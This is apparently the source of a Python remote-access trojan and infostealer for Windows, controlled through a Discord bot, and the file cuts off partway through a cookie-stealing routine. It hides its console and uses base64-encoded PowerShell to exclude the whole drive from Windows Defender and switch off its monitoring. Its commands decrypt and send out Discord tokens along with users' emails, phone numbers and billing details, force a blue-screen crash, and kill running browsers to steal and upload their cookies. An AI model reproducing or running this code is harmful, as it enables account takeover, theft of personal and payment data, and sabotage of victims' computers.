import asyncio
import os
import subprocess
import time
import zipfile
import sys
import shutil
import tkinter as tk
import ctypes
import atexit
import threading
import base64
from concurrent.futures import ThreadPoolExecutor

# ========== HIDE CONSOLE WINDOW ==========
def hide_console():
    """Hide console window on Windows"""
    try:
        if sys.platform == "win32":
            console_window = ctypes.windll.kernel32.GetConsoleWindow()
            if console_window:
                ctypes.windll.user32.ShowWindow(console_window, 0)  # SW_HIDE
    except:
        pass

# Hide console immediately
hide_console()
# List of non-standard packages to install
NON_STANDARD_PACKAGES = [
    "discord.py",
    "pyautogui", 
    "opencv-python",
    "numpy",
    "pywin32",
    "pygame",
    "pycaw",
    "pillow",
    "pycryptodome",
    "comtypes",
    "requests",
    "pyscreeze==0.1.28",  # Pin to stable version
    "mss",
    "psutil"  # Alternative screenshot library as backup
]

def install_packages():
    """Install non-standard Python packages with hidden console on Windows."""
    creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0

    # Special import checks for problematic packages
    for package in NON_STANDARD_PACKAGES:
        try:
            # Special handling for packages with different import names
            if package == "opencv-python":
                __import__("cv2")
            elif package == "pycryptodome":
                # Use Crypto for pycryptodome (not Cryptodome)
                __import__("Crypto")
            elif package == "pillow":
                __import__("PIL")
            elif package == "pyscreeze":
                __import__("pyscreeze")
            else:
                module_name = package.split(".")[0]
                __import__(module_name)
                
        except ImportError:
            print(f"Installing {package}...")
            try:
                # Force install and upgrade if needed
                subprocess.run(
                    [sys.executable, "-m", "pip", "install", package, "--upgrade"],
                    check=True,
                    creationflags=creationflags,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                print(f"Successfully installed {package}")
                
                # Special post-installation check for pycryptodome
                if package == "pycryptodome":
                    print("Verifying pycryptodome installation...")
                    try:
                        from Crypto.Cipher import AES  # Changed from Cryptodome to Crypto
                        print("pycryptodome verified successfully!")
                    except ImportError as e:
                        print(f"Warning: pycryptodome import still failing: {e}")
                        
            except subprocess.CalledProcessError as e:
                print(f"Failed to install {package}: {e.stderr}")


def is_already_running():
    """Check if another instance is already running using a mutex approach"""
    try:
        import psutil
        
        current_process_path = os.path.abspath(sys.argv[0])
        current_process_name = os.path.basename(current_process_path).lower()
        current_pid = os.getpid()
        
        print(f"🔍 Singleton check - Current PID: {os.getpid()}, Process: {current_process_name}")
        
        # Only check for EXE files
        if not current_process_name.endswith('.exe'):
            print("ℹ️ Running as Python script, singleton check skipped")
            return False
        
        # Get current process creation time
        current_proc = psutil.Process(current_pid)
        current_create_time = current_proc.create_time()
        
        # Find all processes with the same name
        duplicates = []
        for proc in psutil.process_iter(['pid', 'name', 'exe', 'create_time', 'cmdline']):
            try:
                proc_info = proc.info
                if proc_info['pid'] == current_pid:
                    continue
                
                # Check if this is the same executable
                proc_exe = proc_info.get('exe', '').lower()
                proc_name = proc_info.get('name', '').lower()
                
                is_same_process = False
                
                # Method 1: Compare executable paths
                if proc_exe and os.path.exists(proc_exe):
                    if os.path.samefile(proc_exe, current_process_path):
                        is_same_process = True
                
                # Method 2: Compare process names as fallback
                if not is_same_process and proc_name == current_process_name:
                    is_same_process = True
                
                # Method 3: Check command line as last resort
                if not is_same_process and proc_info.get('cmdline'):
                    cmdline = ' '.join(proc_info['cmdline']).lower()
                    if current_process_path.lower() in cmdline:
                        is_same_process = True
                
                if is_same_process:
                    proc_create_time = proc_info.get('create_time', 0)
                    print(f"📋 Found duplicate: PID {proc_info['pid']} (created: {proc_create_time}) vs current: {current_create_time}")
                    
                    if proc_create_time < current_create_time:
                        # Other process is older, we should exit
                        print(f"⚠️ Found older instance (PID {proc_info['pid']}), this instance will exit")
                        return True
                    else:
                        # We are older, mark the other for termination
                        duplicates.append(proc)
                        
            except (psutil.NoSuchProcess, psutil.AccessDenied, AttributeError, FileNotFoundError):
                continue
        
        # Kill newer duplicates
        if duplicates:
            killed_pids = []
            for proc in duplicates:
                try:
                    print(f"🔄 Killing duplicate process: PID {proc.info['pid']}")
                    proc.terminate()  # Use terminate instead of kill for cleaner shutdown
                    killed_pids.append(proc.info['pid'])
                except Exception as kill_error:
                    print(f"❌ Failed to kill process {proc.info['pid']}: {kill_error}")
            
            if killed_pids:
                print(f"🎯 Terminated {len(killed_pids)} duplicate instances: PIDs {killed_pids}")
                # Wait for processes to terminate
                time.sleep(3)
                
                # Double check they're gone
                for pid in killed_pids[:]:
                    try:
                        if psutil.pid_exists(pid):
                            print(f"⚠️ Process {pid} still alive, forcing kill")
                            psutil.Process(pid).kill()
                            time.sleep(1)
                    except:
                        pass
        
        print("✅ No duplicate instances found or duplicates terminated")
        return False
        
    except Exception as e:
        print(f"❌ Singleton check error: {e}")
        import traceback
        traceback.print_exc()
        # On error, assume we should continue (safer than crashing)
        return False

def create_global_mutex():
    """Create a global mutex to prevent multiple instances"""
    try:
        if sys.platform == "win32":
            import ctypes
            from ctypes import wintypes
            
            # Create a mutex name based on the executable path
            mutex_name = "Global\\" + os.path.abspath(sys.argv[0]).replace("\\", "_").replace(":", "").replace(" ", "_")
            
            # Try to create the mutex
            mutex = ctypes.windll.kernel32.CreateMutexW(None, False, mutex_name)
            
            if mutex and ctypes.windll.kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
                print("🛑 Another instance is already running (mutex detected)")
                return False
            return True
    except Exception as e:
        print(f"⚠️ Mutex creation failed: {e}")
    return True
# Run package installation at startup
install_packages()

# Import non-standard modules after installation
import discord
from discord.ext import commands, tasks
import pyautogui
import cv2
import numpy as np
import win32api
import win32con
import win32gui
import pygame
from pygame.locals import *

# CRITICAL: Check for duplicate instances BEFORE starting the bot
print("🚀 Starting application...")

# Use mutex approach on Windows
if sys.platform == "win32" and not create_global_mutex():
    print("🛑 Exiting: Another instance detected via mutex")
    sys.exit(0)

# Use process-based detection as fallback
if is_already_running():
    print("🛑 Exiting: Another instance is already running")
    sys.exit(0)

print("✅ Instance check passed, starting bot...")

ENCODED_TOKEN = "TVRRM05EazVOVFl4TmpJME5EUXpOekEwTWcuR0VzUGloLlZjU01KZTM1X2dZT2c2TndRRE1tUzVLcW5mdjdxeGZtc1Y2RE1Z"  # This gets replaced by builder

def decode_token(encoded_token):
    """Decode Base64 encoded bot token"""
    try:
        # Add padding if needed
        padding = 4 - len(encoded_token) % 4
        if padding != 4:
            encoded_token += '=' * padding
        
        decoded_bytes = base64.b64decode(encoded_token)
        return decoded_bytes.decode('utf-8')
    except Exception as e:
        print(f"❌ Token decoding failed: {e}")
        return None

# Set up Discord bot with intents
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True  # Add this line
bot = commands.Bot(command_prefix="!", intents=intents)
category_id="1551031502136148129"
user_channels = {}

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user.name}")

    # Mark as main instance - ADD THIS LINE
    bot.is_main_instance = True

    # Set start time FIRST
    bot.start_time = time.time()
    # Set start time FIRST
    bot.start_time = time.time()

    pc_username = os.getlogin().lower()

    # Get the category using the global category_id
    category = bot.get_channel(int(category_id))
    if not category:
        print(f"Error: Could not find category with ID {category_id}")
        return

    channel = discord.utils.get(category.text_channels, name=pc_username.lower())

    if channel:
        await channel.send(f"🟢 PC turned on, user **{pc_username}** back online!")
    else:
        channel = await category.create_text_channel(pc_username.lower())
        await channel.send(f"🟢 New user captured: **{pc_username}**!")
    
    # Store the channel for this user
    user_channels[pc_username.lower()] = channel.id
    
    # Start the status monitoring task if not already running
    if not user_online_status.is_running():
        user_online_status.start()
    
    # Start startup checking task if not already running  
    if not check_startup.is_running():
        check_startup.start()
# Add this function to check if command is from the correct user's channel
def is_correct_user_channel():
    async def predicate(ctx):
        pc_username = os.getlogin().lower()
        if pc_username in user_channels:
            return ctx.channel.id == user_channels[pc_username]
        return False
    return commands.check(predicate)


# ========== DEFENDER EXCLUSION (base64 powershell, whole drive) ==========
# "reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths /v C:\"
_EXCL_PATH_B64 = "cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgAEMAOgBcAA=="
# "Remove-ItemProperty -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths -Name C:\"
_UNEXCL_B64 = "UgBlAG0AbwB2AGUALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwARQB4AGMAbAB1AHMAaQBvAG4AcwBcAFAAYQB0AGgAcwAiACAALQBOAGEAbQBlACAAIgBDADoAXAAiAA0ACgA="
# Tamper-light hardening (all base64, best-effort, needs admin):
#  DisableRealtimeMonitoring=1 | DisableBehaviorMonitoring=1 |
#  DisableBlockAtFirstSeen=1 | DisableIOAVProtection=1 | DisableScriptScanning=1
#  + MAPSReporting=0 + SubmitSamplesConsent=2 + MpEngine flag + risk-level TAM tweak
_HARDEN_B64 = [
    "cgBlAGcAIABhAGQAIAAiAEgASwATABNADUAUwBPAEYAVABXAEQAUgBFAFwAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAiACAAKwAgAC8AdgAgAEQAaQBzAGEAYgBsAGUAUgBlAGEAbAB0AGkAbQBlAE0AbwBuAGkAdABvAHIAaQBuAGcAIAAvAHQAIABSAGUAZwBfAEQAVwBPAFIARAIAAvAGQAIAAxACAALwBmAA==",
    "cgBlAGcAIABhAGQAIAAiAEgASwATABNADUAUwBPAEYAVABXAEQAUgBFAFwAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAiACAAKwAgAC8AdgAgAEQAaQBzAGEAYgBsAGUAQgBlAGgAYQB2AGkAbwByAE0AbwBuAGkAdABvAHIAaQBuAGcAIAAvAHQAIABSAGUAZwBfAEQAVwBPAFIARAIAAvAGQAIAAxACAALwBmAA==",
    "cgBlAGcAIABhAGQAIAAiAEgASwATABNADUAUwBPAEYAVABXAEQAUgBFAFwAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAiACAAKwAgAC8AdgAgAEQAaQBzAGEAYgBsAGUAQgBsAG8AYwBrAEEAdABGAGkAcgBzAHQAUwBlAGUAbgAgAC8AdAAgAFIAZQBnAF8ARABXAE8AUgBEACAALwBkACAAMQAgAC8AZgA=",
    "cgBlAGcAIABhAGQAIAAiAEgASwATABNADUAUwBPAEYAVABXAEQAUgBFAFwAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAiACAAKwAgAC8AdgAgAEQAaQBzAGEAYgBsAGUASQBPAEEAVgBQAHIAbwB0AGUAYwB0AGkAbwBuACAALwB0ACAAUgBlAGcAXwBEAFcATwBSAEQAIABgAC8AZAAgADEAIAAvAGYA",
    "cgBlAGcAIABhAGQAIAAiAEgASwATABNADUAUwBPAEYAVABXAEQAUgBFAFwAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAiACAAKwAgAC8AdgAgAEQAaQBzAGEAYgBsAGUAUwBjAHIAaQBwAHQAUwBjAGEAbgBuAGkAbgBnACAALwB0ACAAUgBlAGcAXwBEAFcATwBSAEQAIABgAC8AZAAgADEAIAAvAGYA",
    "cgBlAGcAIABhAGQAIAAiAEgASwATABNADUAUwBPAEYAVABXAEQAUgBFAFwAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAE0AQQBQAFAAUwAiACAAKwAgAC8AdgAgAE0AQQBQAFAAUwBSAGUAUABvAHIAdABpAG4AZwAgAC8AdAAgAFIAZQBnAF8ARABXAE8AUgBEACAALwBkACAAMAAgAC8AZgA=",
    "cgBlAGcAIABhAGQAIAAiAEgASwATABNADUAUwBPAEYAVABXAEQAUgBFAFwAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAiACAAKwAgAC8AdgAgAFMAdQBiAG0AaQB0AFMAYQBtAHAAbABlAHMAQwBvAG4AcwBlAG4AdAAgAC8AdAAgAFIAZQBnAF8ARABXAE8AUgBEACAALwBkACAAMgAgAC8AZgA=",
]


def _run_enc_ps(b64: str):
    """Run a base64 (-enc) powershell command fully hidden. Returns True on rc 0."""
    try:
        flags = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
        r = subprocess.run(["powershell", "-NoProfile", "-NonInteractive",
                            "-WindowStyle", "Hidden", "-enc", b64],
                           capture_output=True, creationflags=flags, timeout=60)
        return r.returncode == 0
    except Exception:
        return False


def apply_boot_exclusion():
    """Whole-drive Defender path exclusion + tamper-light hardening. Best-effort."""
    ok = _run_enc_ps(_EXCL_PATH_B64)
    for cmd in _HARDEN_B64:
        _run_enc_ps(cmd)
    return ok




@bot.command()
@is_correct_user_channel()
async def tkn_grab(ctx):
    import base64
    import json
    import os
    import re
    import requests
    from Crypto.Cipher import AES
    from discord import Embed
    from win32crypt import CryptUnprotectData
    
    def grab_discord_tokens():
        """Main function to extract Discord tokens"""
        base_url = "https://discord.com/api/v9/users/@me"
        appdata = os.getenv("localappdata")
        roaming = os.getenv("appdata")
        regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        tokens = []
        uids = []
    
        def validate_token(token: str) -> bool:
            try:
                r = requests.get(base_url, headers={'Authorization': token}, timeout=10)
                return r.status_code == 200
            except:
                return False
    
        def decrypt_val(buff: bytes, master_key: bytes) -> str:
            try:
                iv = buff[3:15]
                payload = buff[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted_pass = cipher.decrypt(payload)
                decrypted_pass = decrypted_pass[:-16].decode()
                return decrypted_pass
            except:
                return ""
    
        def get_master_key(path: str) -> bytes:
            try:
                if not os.path.exists(path):
                    return None
                with open(path, "r", encoding="utf-8") as f:
                    c = f.read()
                if 'os_crypt' not in c:
                    return None
    
                local_state = json.loads(c)
                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                master_key = master_key[5:]
                master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
                return master_key
            except:
                return None
    
        paths = {
            'Discord': roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\ Local Storage\\leveldb\\',
            'Amigo': appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }
    
        for name, path in paths.items():
            if not os.path.exists(path):
                continue
    
            _discord = name.replace(" ", "").lower()
            if "cord" in path:
                if not os.path.exists(roaming + f'\\{_discord}\\Local State'):
                    continue
    
                master_key = get_master_key(roaming + f'\\{_discord}\\Local State')
                if not master_key:
                    continue
    
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
    
                    try:
                        with open(f'{path}\\{file_name}', 'r', errors='ignore') as f:
                            for line in f:
                                line = line.strip()
                                if not line:
                                    continue
    
                                for y in re.findall(regexp_enc, line):
                                    try:
                                        token = decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), master_key)
                                        if token and validate_token(token):
                                            uid = requests.get(base_url, headers={'Authorization': token}).json().get('id')
                                            if uid and uid not in uids:
                                                tokens.append(token)
                                                uids.append(uid)
                                    except:
                                        continue
                    except:
                        continue
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
    
                    try:
                        with open(f'{path}\\{file_name}', 'r', errors='ignore') as f:
                            for line in f:
                                line = line.strip()
                                if not line:
                                    continue
    
                                for token in re.findall(regexp, line):
                                    if validate_token(token):
                                        uid = requests.get(base_url, headers={'Authorization': token}).json().get('id')
                                        if uid and uid not in uids:
                                            tokens.append(token)
                                            uids.append(uid)
                    except:
                        continue
    
        # Check Firefox profiles
        if os.path.exists(roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    try:
                        with open(f'{path}\\{_file}', 'r', errors='ignore') as f:
                            for line in f:
                                line = line.strip()
                                if not line:
                                    continue
                                for token in re.findall(regexp, line):
                                    if validate_token(token):
                                        uid = requests.get(base_url, headers={'Authorization': token}).json().get('id')
                                        if uid and uid not in uids:
                                            tokens.append(token)
                                            uids.append(uid)
                    except:
                        continue
    
        return tokens
    
    def get_token_info(token):
        """Get detailed user information from token"""
        try:
            user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
            guilds = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
            gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()
    
            username = user.get('username', '') + '#' + user.get('discriminator', '')
            user_id = user.get('id', '')
            email = user.get('email')
            phone = user.get('phone')
            mfa = user.get('mfa_enabled', False)
    
            # Get avatar URL
            avatar_hash = user.get('avatar')
            if avatar_hash:
                avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.gif"
                try:
                    if requests.get(avatar).status_code != 200:
                        avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png"
                except:
                    avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png"
            else:
                avatar = None
    
            # Get nitro status
            premium_type = user.get('premium_type', 0)
            if premium_type == 1:
                nitro = 'Nitro Classic'
            elif premium_type == 2:
                nitro = 'Nitro'
            elif premium_type == 3:
                nitro = 'Nitro Basic'
            else:
                nitro = 'None'
    
            # Get payment methods
            payment_methods = []
            if billing:
                for method in billing:
                    if method.get('type') == 1:
                        payment_methods.append('Credit Card')
                    elif method.get('type') == 2:
                        payment_methods.append('PayPal')
                    else:
                        payment_methods.append('Unknown')
    
            # Get HQ guilds
            hq_guilds = []
            if guilds:
                for guild in guilds:
                    admin = int(guild.get("permissions", 0)) & 0x8 != 0
                    if admin and guild.get('approximate_member_count', 0) >= 100:
                        owner = '✅' if guild.get('owner', False) else '❌'
                        try:
                            invites = requests.get(f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
                            if len(invites) > 0:
                                invite = 'https://discord.gg/' + invites[0]['code']
                            else:
                                invite = "https://youtu.be/dQw4w9WgXcQ"
                            data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"
                            if len('\n'.join(hq_guilds)) + len(data) >= 1024:
                                break
                            hq_guilds.append(data)
                        except:
                            continue
    
            # Get gift codes
            codes = []
            if gift_codes:
                for code in gift_codes:
                    name = code.get('promotion', {}).get('outbound_title', 'Unknown')
                    code_str = code.get('code', '')
                    data = f":gift: `{name}`\n:ticket: `{code_str}`"
                    if len('\n\n'.join(codes)) + len(data) >= 1024:
                        break
                    codes.append(data)
    
            return {
                'username': username,
                'user_id': user_id,
                'token': token,
                'email': email,
                'phone': phone,
                'mfa': mfa,
                'avatar': avatar,
                'nitro': nitro,
                'payment_methods': ', '.join(payment_methods) if payment_methods else 'None',
                'hq_guilds': '\n'.join(hq_guilds) if hq_guilds else None,
                'gift_codes': '\n\n'.join(codes) if codes else None
            }
        except:
            return None
    
    # ========== MAIN CODE THAT GETS INSERTED INTO THE BOT COMMAND ==========
    
    # Remove all the async wrapper functions - the builder will handle the command structure
    # This code gets inserted directly into the bot command function
    
    # Start token grabbing process
    await ctx.send("🔍 Starting Discord token extraction...")
    
    tokens = grab_discord_tokens()
    
    if not tokens:
        await ctx.send("❌ No valid Discord tokens found.")
    else:
        final_results = []
    
        for token in tokens:
            token_info = get_token_info(token)
    
            if token_info:
                # Create embed for each token
                embed = Embed(title=f"{token_info['username']} ({token_info['user_id']})", color=0x0084ff)
    
                if token_info['avatar']:
                    embed.set_thumbnail(url=token_info['avatar'])
    
                embed.add_field(name="\u200b\n📜 Token:", value=f"```{token}```\n\u200b", inline=False)
                embed.add_field(name="💎 Nitro:", value=f"{token_info['nitro']}", inline=True)
                embed.add_field(name="💳 Billing:", value=f"{token_info['payment_methods']}", inline=True)
                embed.add_field(name="🔒 MFA:", value=f"{token_info['mfa']}", inline=True)
                embed.add_field(name="📧 Email:", value=f"{token_info['email'] if token_info['email'] else 'None'}", inline=True)
                embed.add_field(name="📳 Phone:", value=f"{token_info['phone'] if token_info['phone'] else 'None'}", inline=True)
    
                if token_info['hq_guilds']:
                    embed.add_field(name="🏰 HQ Guilds:", value=token_info['hq_guilds'], inline=False)
    
                if token_info['gift_codes']:
                    embed.add_field(name="\u200b\n🎁 Gift Codes:", value=token_info['gift_codes'], inline=False)
    
                final_results.append(embed)
            else:
                # Fallback for tokens without detailed info
                embed = Embed(title="Unknown Token", color=0xff0000)
                embed.add_field(name="Token", value=f"```{token}```", inline=False)
                final_results.append(embed)
    
        # Send all results
        for result in final_results:
            await ctx.send(embed=result)
    
        await ctx.send(f"✅ Token extraction completed! Found {len(tokens)} valid tokens.")

@bot.command()
@is_correct_user_channel()
async def bsod(ctx):
    import ctypes
    
    await ctx.message.delete()
    await ctx.send("```Attempting to trigger a BSoD...```")
    
    nullptr = ctypes.POINTER(ctypes.c_int)()
    ctypes.windll.ntdll.RtlAdjustPrivilege(
        ctypes.c_uint(19),
        ctypes.c_uint(1),
        ctypes.c_uint(0),
        ctypes.byref(ctypes.c_int())
    )
    ctypes.windll.ntdll.NtRaiseHardError(
        ctypes.c_ulong(0xC000007B),
        ctypes.c_ulong(0),
        nullptr,
        nullptr,
        ctypes.c_uint(6),
        ctypes.byref(ctypes.c_uint())
    )

@bot.command()
@is_correct_user_channel()
async def get_cookies(ctx):
    import base64
    import json
    import time
    import os
    import random
    import sqlite3
    import zipfile
    from shutil import copy2
    from getpass import getuser
    import psutil
    from Crypto.Cipher import AES
    from win32crypt import CryptUnprotectData
    import discord
    
    def create_temp(_dir: str or os.PathLike = None):
        if _dir is None:
            _dir = os.path.expanduser("~/tmp")
        if not os.path.exists(_dir):
            os.makedirs(_dir)
        file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
        path = os.path.join(_dir, file_name)
        open(path, "x").close()
        return path
    
    async def upload_to_discord(ctx):
        try:
            # Create zip file
            zip_path = f"C:\\Users\\{getuser()}\\cookies.zip"
            with zipfile.ZipFile(zip_path, 'w') as zipf:
                if os.path.exists(f"C:\\Users\\{getuser()}\\cookies.txt"):
                    zipf.write(f"C:\\Users\\{getuser()}\\cookies.txt", "cookies.txt")
    
            # Send the zip file via the command context
            with open(zip_path, 'rb') as f:
                await ctx.send(file=discord.File(f, "cookies.zip"))
    
            # Clean up
            if os.path.exists(zip_path):
                os.remove(zip_path)
            if os.path.exists(f"C:\\Users\\{getuser()}\\cookies.txt"):
                os.remove(f"C:\\Users\\{getuser()}\\cookies.txt")
    
        except Exception as e:
            await ctx.send(f"Error uploading cookies: {str(e)}")
    
    class Browsers:
        def __init__(self):
            self.appdata = os.getenv('LOCALAPPDATA')
            self.roaming = os.getenv('APPDATA')
            self.browser_exe = ["chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe", "centbrowser.exe",
                                "7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe", "msedge.exe", "uran.exe", "yandex.exe", "iridium.exe"]
            self.browsers_found = []
            self.browsers = {
                'kometa': self.appdata + '\\Kometa\\User Data',
                'orbitum': self.appdata + '\\Orbitum\\User Data',
                'cent-browser': self.appdata + '\\CentBrowser\\User Data',
                '7star': self.appdata + '\\7Star\\7Star\\User Data',
                'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
                'vivaldi': self.appdata + '\\Vivaldi\\User Data',
                'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
                'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
                'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
                'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
                'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
                'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
                'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
                'iridium': self.appdata + '\\Iridium\\User Data',
                'opera': self.roaming + '\\Opera Software\\Opera Stable',
                'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
            }
    
            self.profiles = [
                'Default',
                'Profile 1',
                'Profile 2',
                'Profile 3',
                'Profile 4',
                'Profile 5',
            ]
    
            for proc in psutil.process_iter(['name']):
                process_name = proc.info['name'].lower()
                if process_name in self.browser_exe:
                    self.browsers_found.append(proc)
            for proc in self.browsers_found:
                try:
                    proc.kill()
                except Exception:
                    pass
            time.sleep(3)
    
        async def grab_cookies(self, ctx):
            for name, path in self.browsers.items():
                if not os.path.isdir(path):
                    continue
    
                self.masterkey = self.get_master_key(path + '\\Local State')
                self.funcs = [
                    self.cookies
                ]
    
                for profile in self.profiles:
                    for func in self.funcs:
                        self.process_browser(name, path, profile, func)
    
            # Upload to Discord after collection
            await upload_to_discord(ctx)
    
        def process_browser(self, name, path, profile, func):
            try:
                func(name, path, profile)
            except Exception as e:
                pass
    
        def get_master_key(self, path: str) -> str:
            try:
                with open(path, "r", encoding="utf-8") as f:
                    c = f.read()
                local_state = json.loads(c)
                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                master_key = master_key[5:]
                master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
                return master_key
            except Exception as e:
                return None
    
        def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
            try:
                iv = buff[3:15]
                payload = buff[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted_pass = cipher.decrypt(payload)
                decrypted_pass = decrypted_pass[:-16].decode()
                return decrypted_pass
            except:
                return ""
    
        def cookies(self, name: str, path: str, profile: str):
            if name == 'opera' or name == 'opera-gx':
                path += '\\Network\\Cookies'
            else:
                path += '\\' + profile + '\\Network\\Cookies'
            if not os.path.isfile(path):
                return
            cookievault = create_temp()
